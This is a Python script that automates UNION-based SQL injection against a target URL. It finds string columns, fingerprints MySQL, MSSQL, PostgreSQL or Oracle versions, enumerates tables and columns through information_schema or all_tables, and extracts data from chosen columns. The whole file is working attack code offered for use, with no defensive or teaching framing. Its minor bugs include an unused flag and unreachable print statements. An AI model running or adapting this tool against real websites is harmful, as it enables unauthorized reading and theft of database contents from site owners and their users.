import urllib

from bs4 import BeautifulSoup
import requests
import re

reserved_words = ['TestSQLinj', 'union', 'select', 'table_name=', 'information_schema.tables--', 'null', 'FROM',
                  'WHERE', 'column_name', 'information_schema.columns']

cleaner_regex = re.compile('.*\|\|.*||@||.*\'.*||.*null.*||.*--.*')


# Helper function to remove the tags from response
# Function to remove tags
def remove_tags(html):
    # parse html content
    soup = BeautifulSoup(html.text, "html.parser")
    for data in soup(['style', 'script']):
        # Remove tags
        data.decompose()
    # return data by retrieving the tag content
    return ' '.join(soup.stripped_strings)


# to determine the column(s) with string as data type
# function used in: step(b-1)
def figure_sting_columns(url, num_col):
    for i in range(1, num_col + 1):
        test_string = "'TestSQLinj'"
        payload_list = ['null'] * num_col
        payload_list[i - 1] = test_string
        sql_payload = "' union select " + ','.join(payload_list) + "-- -"
        sql_payload_oracle = "' union select " + ','.join(payload_list) + " from dual" + "-- -"
        res = requests.get(url + sql_payload).text
        res_oracle = requests.get(url + sql_payload_oracle).text
        if test_string.strip('\'') in res:
            return i, sql_payload
        elif test_string.strip('\'') in res_oracle:
            isOracle = True
            return i, sql_payload_oracle
    return False


# return DB type and version
def figure_DB_version(url, sql_payload):
    isOracle = False
    res_before = requests.get(url)
    # Info for Detection for MsSQL , MYSQL
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', '@@version')
    inj_url = url + inj_query
    res_after = requests.get(inj_url)

    # Info for Detection for PostgreSQL
    inj_query_PostgreSQL = str(sql_payload).replace('\'TestSQLinj\'', 'version()')
    inj_url_PostgreSQL = url + inj_query_PostgreSQL
    res_after_PostgreSQL = requests.get(inj_url_PostgreSQL)

    if res_after.status_code == 200:
        cleand_after_res = str(remove_tags(res_after))
        databases_version = re.search("[0-9].*ubuntu[0-9].*|MySQL.*[0-9]|SQL.*[1-9].*", cleand_after_res)
        return databases_version, isOracle

    elif res_after_PostgreSQL.status_code == 200:
        cleand_after_res_PostgreSQL = str(remove_tags(res_after_PostgreSQL))
        databases_version = re.search("PostgreSQL [0-9].*[0-9]", cleand_after_res_PostgreSQL)
        return databases_version, isOracle

    else:
        isOracle = True
        inj_query_Oracle = str(sql_payload).replace('\'TestSQLinj\'', 'banner').replace('from dual-- -', 'FROM v$version -- -')
        inj_url_Oracle = url + inj_query_Oracle
        res_after_Oracle = requests.get(inj_url_Oracle)
        cleand_after_res_oracle = str(remove_tags(res_after_Oracle))
        databases_version = re.search("Oracle Database [0-9].*[0-9]", cleand_after_res_oracle)
        return databases_version, isOracle


# return list of tables in DB
# function used in: step(a-2)
def figure_tables_in_DB(url, sql_payload, isOracle):
    if isOracle:
        res_before_oracle = requests.get(url)
        inj_tables_schema = str(sql_payload).replace('from dual-- -', 'from all_tables-- -')
        inj_query_Oracle = str(inj_tables_schema).replace('\'TestSQLinj\'', 'table_name')
        inj_url_Oracle = url + inj_query_Oracle
        res_after_Oracle = requests.get(inj_url_Oracle)
        cleand_after_res = remove_tags(res_after_Oracle).split()
        cleand_before_res = remove_tags(res_before_oracle).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses

    else:
        res_before = requests.get(url)
        inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'table_name').strip(
            '-- -') + ' FROM information_schema.tables-- -'
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses


# return list of columns in specific table
# function used in: step(b-2)
def figure_columns_in_table(url, sql_payload, table_name, isOracle):
    if isOracle:
        res_before = requests.get(url)
        extract_query = ' FROM all_tab_columns WHERE table_name=\'{}\'-- -'.format(table_name)
        inj_query_schema = str(sql_payload).replace('from dual', '')
        inj_query = str(inj_query_schema).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        reserved_words.append('\'{}\'--'.format(table_name))
        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses
    else:
        res_before = requests.get(url)
        extract_query = ' FROM information_schema.columns WHERE table_name=\'{}\'-- -'.format(table_name)
        inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        reserved_words.append('\'{}\'--'.format(table_name))
        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses


# return data in selected columns
# function used in: step(c-2)
def figure_data_in_columns(url, sql_payload, table_name, column_name):
    res_before = requests.get(url)
    inj_query = str(sql_payload).strip('-- -')
    inj_query = str(inj_query).replace(' from dual', '')
    extract_query = ' FROM {}-- -'.format(table_name)
    inj_query_1 = str(inj_query).replace('\'TestSQLinj\'', column_name)
    inj_query_2 = inj_query_1 + extract_query
    inj_url = url + inj_query_2
    print(inj_url)
    res_after = requests.get(inj_url)
    cleand_after_res = remove_tags(res_after).split()
    cleand_before_res = remove_tags(res_before).split()
    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
    print("Ur data is here: ")
    new_diff_in_responses = []
    for i in diff_in_responses:
        if i not in reserved_words:
            cleantext = re.sub(cleaner_regex, '', i)
            if cleantext != '':
                new_diff_in_responses.append(cleantext)
    return new_diff_in_responses
    for i in new_diff_in_responses:
        print(i)
